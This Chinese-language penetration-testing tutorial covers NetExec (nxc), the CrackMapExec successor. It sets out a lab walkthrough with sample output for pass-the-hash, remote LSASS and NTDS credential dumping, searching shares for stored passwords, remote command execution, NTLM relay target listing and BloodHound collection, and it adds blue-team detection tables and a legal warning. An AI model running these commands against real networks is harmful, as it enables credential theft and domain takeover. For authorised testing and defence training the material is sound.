# NetExec（NetExec / `nxc`，CrackMapExec 的官方后继）

> **一句话**：CrackMapExec 停止维护后的正统继承者——同样的多协议批量评估思路，命令名换成 `nxc`，模块更多、维护更活跃。
> **分类**：后渗透 / 横向移动 ｜ **Kali 包**：`netexec`（命令 `nxc`、`nxcdb`）｜ **官方文档**：<https://github.com/Pennyw0rth/NetExec> ｜ 文档站：<https://www.netexec.wiki/>

---

## 1. 它解决什么问题

跟 CrackMapExec 完全相同的问题：**验证「一个凭据/一个哈希」在整片网络的可用性与能力边界**。

为什么还要单列一篇：

1. **CME 已停更**（作者 `mpgn` 退休），新漏洞/新协议支持只进 NetExec；
2. NetExec 的**模块生态**更活跃（`lsassy`、`spider_plus`、`zerologon`、`ntlm`、`petitpotam` 等）；
3. 命令从 `crackmapexec`/`cme` 改为 **`nxc`**，参数**基本兼容但并非 100% 一致**，照抄老命令会踩坑。

| 对比项 | CrackMapExec | NetExec |
|--------|--------------|---------|
| 命令名 | `crackmapexec` / `cme` | `nxc` |
| 数据库工具 | `cmedb` | `nxcdb` |
| 维护状态 | 归档，不再更新 | 活跃维护 |
| 模块数量 | 较少 | 更多（且持续新增） |
| 参数兼容性 | —— | 大部分兼容，部分重命名（如协议名、`--local-auth` 行为细节） |

详见 [`crackmapexec.md`](crackmapexec.md) —— **两者的工作原理、协议知识、防御视角完全共用**，本篇只讲差异与 NetExec 的实用扩展。

---

## 2. 工作原理

与 CME 一致（协议客户端 + 并发调度 + 结果表格化），差异在于：

- **协议插件化**：`nxc <protocol>` 的协议集合与模块加载机制重构，新协议/新模块以插件形式独立维护，升级不必等主体版本。
- **模块（module）机制**：`nxc <proto> -M <module>`，用 `-M <module> --options` 查看模块参数。模块可访问 NetExec 的凭据库，实现「抓到的凭据自动进入下一轮尝试」。
- **数据库**：`nxcdb` 命令进入交互式凭据/主机库，与 CME 的 `cmedb` 类似（底层同为 SQLite/Postgres）。
- **Kerberos 支持增强**：`--use-kcache`、`-k`、`--dc-list` 等更完整。
- **命令名口诀**：`nxc` = **N**et e**X**e**C**。

---

## 3. 安装与快速上手

```bash
sudo apt update
sudo apt install netexec
nxc --version
```

```console
$ nxc --help | head -30
[*] First time use detected
[*] Creating home directory structure
[*] Creating default workspace
...
usage: nxc [-h] [-t THREADS] [--timeout TIMEOUT] [--jitter INTERVAL]
           [--no-progress] [--verbose] [--version]
           {ssh,rdp,ldap,mssql,winrm,ftp,smb,ssh,nfs,vnc} ...
```

> 首次运行会在 `~/.nxc/` 建配置与工作区目录，这是正常现象。

最小示例（**仅限授权/靶场**）：

```bash
nxc smb 192.168.56.0/24 -u jdoe -p 'Summer2024!'
```

```console
SMB         192.168.56.10  445    DC01     [*] Windows Server 2019 Build 17763 x64 (name:DC01) (domain:contoso.local) (signing:True) (SMBv1:False)
SMB         192.168.56.10  445    DC01     [+] contoso.local\jdoe:Summer2024!
```

CME → NetExec 迁移映射：

| CrackMapExec | NetExec |
|--------------|---------|
| `cme smb ...` / `crackmapexec smb ...` | `nxc smb ...` |
| `cme mssql ...` | `nxc mssql ...`（参数有调整，见 `nxc mssql --help`） |
| `cmedb` | `nxcdb` |
| `-M <module>` / `-L` | 同样支持：`nxc smb -L`、`nxc smb -M <name> --options` |

---

## 4. 核心参数详解

与 CME 共用的参数（`-u/-p/-H/-k/--local-auth/-d/-t/--jitter/--continue-on-success/--no-bruteforce/--log`）见 [`crackmapexec.md` 第 4 节](crackmapexec.md#4-核心参数详解)。下面只列 **NetExec 特有或行为有变化**的部分：

| 参数 | 作用 | 使用建议 |
|------|------|----------|
| `nxc <proto> <targets>` | 与 CME 同构 | `nxc` 替代 `cme` |
| `--use-kcache` | 用 `KRB5CCNAME` 指定 ccache 认证 | Kerberos 攻击后的标准用法 |
| `--dc-list` | 用域控列表做目标扩展 | 自动定位 DC，省去手工枚举 |
| `-M <module>` | 加载模块 | `-L` 列表、`--options` 看参数 |
| `-M lsassy` | 远程 LSASS 转储（无需落 Mimikatz 文件） | 高价值模块，敏感度高，需授权 |
| `-M spider_plus` | 遍历共享并索引文件 | 收集阶段主力（找配置/脚本里的凭据） |
| `-M zerologon` / `-M petitpotam` | CVE 检测/利用模块 | **仅授权环境**；检测即用 |
| `--shares` / `--users` / `--sessions` / `--loggedon-users` / `--pass-pol` | 同 CME | 语义一致 |
| `--sam` / `--lsa` / `--ntds` / `--dpapi` | 凭据获取 | `--dpapi` 是 NetExec 较实用的补充 |
| `-x` / `-X` | 执行 cmd / PowerShell | `-x 'whoami'` |
| `--exec-method` | `wmiexec`/`smbexec`/`mmcexec`/`atexec` | 一种被拦就换 |
| `--local-auth` | 本地账户 | 验证本地管理员复用 |
| `nxc ldap <dc> --bloodhound -c All` | **直接采集 BloodHound 数据** | 省去单独跑 collector（见 [`bloodhound.md`](bloodhound.md)） |
| `nxc smb <range> --gen-relay-list out.txt` | 生成「可中继目标列表」（signing 关闭的主机） | 与 `ntlmrelayx` 直接配合 |
| `nxcdb` | 交互式数据库 | 查询历史抓取结果，避免重复劳动 |

---

## 5. 实战演练

> **环境声明**：全部在**自建 AD 靶场（GOAD / Host-Only 自建域）**执行。示例域 `contoso.local`，DC `192.168.56.10`。**绝对禁止对未授权网段发起认证尝试。**

### 场景 1：替代 CME 做摸底与凭据验证

```bash
# 无凭据摸底（含可中继目标筛选）
nxc smb 192.168.56.0/24 --gen-relay-list /tmp/relay_targets.txt
cat /tmp/relay_targets.txt
```

```console
SMB         192.168.56.10  445    DC01     [*] Windows Server 2019 Build 17763 x64 (name:DC01) (domain:contoso.local) (signing:True) (SMBv1:False)
SMB         192.168.56.20  445    WEB01    [*] Windows Server 2016 Build 14393 x64 (name:WEB01) (domain:contoso.local) (signing:False) (SMBv1:True)
```

```console
$ cat /tmp/relay_targets.txt
192.168.56.20
```

**解读**：只有 `signing:False` 的主机会被写进 relay 列表——这些主机可以作为 NTLM 中继的目标。**这是 NetExec 相对 CME 最省事的增强之一**。

```bash
# 凭据可用性验证（记牢 --continue-on-success 与 --no-bruteforce 的组合）
nxc smb 192.168.56.0/24 -u jdoe -p 'Summer2024!' --continue-on-success
```

### 场景 2：模块化抓取（lsassy / dpapi / ntds）与「不给目标落盘」

```bash
# ① 先确认有本地管理员权限
nxc smb 192.168.56.20 -u jdoe -p 'Summer2024!' 
#   => 无 (Pwn3d!) 说明只有普通权限，先换有权限的凭据

nxc smb 192.168.56.20 --local-auth -u Administrator -H ':31d6cfe0d16ae931b73c59d7e0c089c0'
#   => [+] WEB01\Administrator:... (Pwn3d!)

# ② 用模块抓 LSASS（远程解析，不落地 Mimikatz 可执行文件）
nxc smb 192.168.56.20 --local-auth -u Administrator -H ':31d6...' -M lsassy
```

```console
LSASS      192.168.56.20  445    WEB01    [+] Dumped LSA secrets in 3.2 seconds
LSASS      192.168.56.20  445    WEB01    CONTOSO\svc_backup:Backup2023!
LSASS      192.168.56.20  445    WEB01    CONTOSO\jdoe:Summer2024!
```

**解读**：`lsassy` 的收益是**明文密码**（若内存中存在），比哈希更好用。相比上传 `mimikatz.exe` 再执行，落盘文件更少、更不易被文件扫描抓到——但 **LSASS 内存读取本身是强 EDR 信号**，见第 9 节。

```bash
# ③ 用模块索引共享文件，找配置里的凭据
nxc smb 192.168.56.0/24 -u jdoe -p 'Summer2024!' -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=/tmp/spider
grep -riE 'password|connectionString' /tmp/spider | head
```

```bash
# ④ 抓 NTDS（域控，需域管/复制权限）
nxc smb 192.168.56.10 -u svc_backup -p 'Backup2023!' --ntds --just-dc-ntlm
```

```console
SMB  192.168.56.10  445  DC01  [+] Dumping the NTDS, this could take a while so be patient
SMB  192.168.56.10  445  DC01  krbtgt:502:aad3b435b51404eeaad3b435b51404ee:f1e2d3c4b5a6978877665544332211fa:::
```

### 场景 3：一次采集同时喂给 BloodHound + 后续隧道

```bash
# ① 用 nxc 直接采集 BloodHound 数据（省掉单独跑 collector）
nxc ldap 192.168.56.10 -u jdoe -p 'Summer2024!' --bloodhound -c All --dns-server 192.168.56.10
ls -l *.zip
```

```console
LDAP  192.168.56.10  389  DC01  [+] 20240915120000_BloodHound.zip (containing 812 objects)
```

**解读**：产出的 zip 直接在 BloodHound CE 里 `Upload` 即可（见 [`bloodhound.md`](bloodhound.md)）。`-c All` 覆盖 ACL/会话/委派等集合，能算出最短攻击路径。

```bash
# ② 用 WinRM 通道执行（SMB 被签名限制时的常用备选）
nxc winrm 192.168.56.20 -u svc_backup -p 'Backup2023!' -x 'whoami /all'

# ③ 双跳场景：先在被控 Linux 主机上起代理，再用 proxychains 驱动 nxc
#   （NetExec 自身不支持代理参数，必须靠 proxychains/LD_PRELOAD 包装）
proxychains4 -q nxc smb 10.10.20.0/24 -u svc_backup -p 'Backup2023!' --shares
```

**解读**：NetExec 是普通 TCP 客户端，**可以用 `proxychains4` 透明代理**（因为 proxychains 走 `LD_PRELOAD` hook libc）。隧道搭建见 [`chisel.md`](chisel.md)、[`ligolo-ng.md`](ligolo-ng.md)、[`proxychains4.md`](proxychains4.md)。

```bash
# ④ 查询数据库，避免重复劳动
nxcdb
```

```console
nxcdb (default) > workspace create clientA
nxcdb (clientA) > proto smb
nxcdb (clientA)(smb) > creds
+----------------------+----------+------------------------------------------+
| user                 | password | hash                                     |
+----------------------+----------+------------------------------------------+
| CONTOSO\svc_backup   | Backup2023! |                                        |
| WEB01\Administrator  |          | 31d6cfe0d16ae931b73c59d7e0c089c0        |
+----------------------+----------+------------------------------------------+
```

---

## 6. 输出解读

与 CME 完全一致的核心信号：`[+]` 认证成功、`(Pwn3d!)` 有本地管理员权限、`signing:False` 可中继、`STATUS_LOGON_FAILURE` 凭据错误、`Dumping the NTDS` 域内凭据到手。详见 [`crackmapexec.md` 第 6 节](crackmapexec.md#6-输出解读)。

NetExec 特有的输出：

| 输出 | 含义 | 下一步 |
|------|------|--------|
| `2024xxxx_BloodHound.zip (containing N objects)` | AD 数据采集完成 | 上传到 BloodHound CE 算攻击路径 |
| `-M lsassy` 返回 **明文密码** | LSASS 内存中存在明文/可解密凭据 | 立即复用到其它主机，并记录该主机的凭据卫生问题 |
| `--gen-relay-list` 写出的文件 | 可中继目标清单 | 喂给 `impacket-ntlmrelayx -tf` |
| `--dpapi` 输出 | 浏览器/凭据管理器中的凭据 | 离线解密需用户主密码（`-m 27800` 等） |
| `Module <name> failed` | 模块依赖/权限/目标环境不满足 | `--verbose` 看详细原因 |
| `First time use detected` | 首次运行建目录 | 正常，忽略 |

---

## 7. 与其他工具配合

```
nxc 摸底 ──► (Pwn3d!) ──► nxc --sam/--lsa/--ntds、-M lsassy ──► 凭据雪球
   │                                                              │
   ├─► nxc --gen-relay-list ──► impacket-ntlmrelayx（中继）        │
   ├─► nxc ldap --bloodhound ──► BloodHound CE（攻击路径）         │
   ├─► nxc winrm -x ──► 无交互执行 ──▲─► evil-winrm（需要交互时）  │
   ├─► proxychains4 + nxc ──► 打第二层内网                        │
   └─► nxcdb ──► 结果留档 ──► 报告 ◄──────────────────────────────┘
```

- 共同原理与防御：[`crackmapexec.md`](crackmapexec.md)
- 单点精打：[`impacket.md`](impacket.md) ｜ 交互 shell：[`evil-winrm.md`](evil-winrm.md)
- 攻击路径：[`bloodhound.md`](bloodhound.md) ｜ 隧道：[`chisel.md`](chisel.md)、[`ligolo-ng.md`](ligolo-ng.md)、[`proxychains4.md`](proxychains4.md)

---

## 8. 常见坑与排错

| 报错/现象 | 原因 | 解决 |
|-----------|------|------|
| `nxc: command not found` | 装的是 CME，或包名不对 | `sudo apt install netexec`；确认 `dpkg -L netexec \| grep bin` |
| 直接照抄 `cme mssql ...` 的老命令报错 | NetExec 的 mssql 协议参数有调整 | 以 `nxc mssql --help` 为准，别硬套 |
| `-M lsassy` 报模块缺失依赖 | 模块需额外 Python 依赖 | 看模块报错提示安装对应依赖；或改用 `--sam/--lsa` |
| `--bloodhound` 产出 0 objects | 权限不足或 `-c` 选项不匹配 | 换有读权限的账号；用 `-c All` 或分项采集 |
| `(Pwn3d!)` 时有时无 | 凭据只在部分主机有本地管理员权限 | 正常现象，重点是**收集哪些主机给了 Pwn3d** |
| Kerberos 认证失败 | FQDN/hosts/krb5.conf 未配 | 参见 [`impacket.md` 第 8 节](impacket.md#8-常见坑与排错) |
| `--ntds` 极慢或报权限错 | 无复制权限/走 VSS 路径 | 换账号；加 `--just-dc-ntlm`；必要时直接用 `impacket-secretsdump` |
| 目标被扫挂/服务无响应 | 并发过高 | `-t` 降到 10–20，加 `--timeout`、`--jitter` |
| 复用旧 CME 模块名报不存在 | 模块已被重命名/移除 | `nxc smb -L` 看当前模块全集 |
| 首次运行刷一堆 `Creating ...` | 初始化 `~/.nxc` | 忽略；若报权限错，检查 `$HOME` 权限 |

---

## 9. 防御视角（蓝队）

**NetExec 的检测与缓解措施与 CrackMapExec 完全相同**，请直接参考 [`crackmapexec.md` 第 9 节](crackmapexec.md#9-防御视角蓝队)，核心仍是：**强制 SMB 签名 + 禁用 NTLM + LAPS + 监控 4662/4624/4625/7045/4769**。

NetExec 特有的补充：

| 特有手法 | 额外检测信号 | 额外缓解 |
|----------|--------------|----------|
| `--gen-relay-list` 前置侦察 | 单源对网段 SMB 协商（`NEGOTIATE`）大量请求 | 强制 SMB 签名（让列表为空，直接瓦解该手法） |
| `-M lsassy` | LSASS 进程被远程打开（句柄访问 `0x1010`/`0x1410`）、`comsvcs.dll MiniDump` 相关行为 | **RunAsPPL / Credential Guard**、EDR LSASS 保护、限制管理员跨主机登录 |
| `-M spider_plus` | 大量文件列举（`READ` on many files）、SMB 读取量异常 | 共享最小权限、SMB 访问审计（5140/5145）、DLP 识别敏感文件外读 |
| `--bloodhound` LDAP 采集 | LDAP 查询量骤增（尤其 `objectClass=*` 类全量枚举）、`nxc` 特征 UA | LDAP 查询审计（1644）、限制匿名 LDAP、EDR 检测枚举脚本 |
| `--dpapi` | 读取用户 `Protect\` 目录、浏览器凭据文件 | 凭据保护、禁用明文保存、EDR 行为规则 |
| `nxcdb` 结果沉淀 | 攻击者本地行为，无网络痕迹 | —— 只能靠**事后取证**（扣押设备） |

---

## 10. 参考

- NetExec 官方仓库：<https://github.com/Pennyw0rth/NetExec>
- NetExec 文档站（模块与用法）：<https://www.netexec.wiki/>
- Kali 工具页：<https://www.kali.org/tools/netexec/>
- 前身 CrackMapExec：[`crackmapexec.md`](crackmapexec.md) ｜ 上游仓库：<https://github.com/mpgn/CrackMapExec>
- 本地命令：`nxc --help`、`nxc smb --help`、`nxc smb -L`、`nxcdb`

## ⚠️ 法律与伦理

对未授权系统进行认证尝试、凭据转储、LSASS 读取均属严重违法：可能触犯《刑法》第 285 条（非法获取计算机信息系统数据、非法控制计算机信息系统）、第 286 条，以及《网络安全法》《数据安全法》《个人信息保护法》。LSASS 内存中常含**用户明文密码**，获取即涉及个人信息的非法处理。

本教程仅用于**书面授权的渗透测试与红队演练、CTF、自建 AD 靶场、蓝队检测能力验证**。请在隔离环境操作，测试后清理所有凭据文件，报告中一律脱敏。
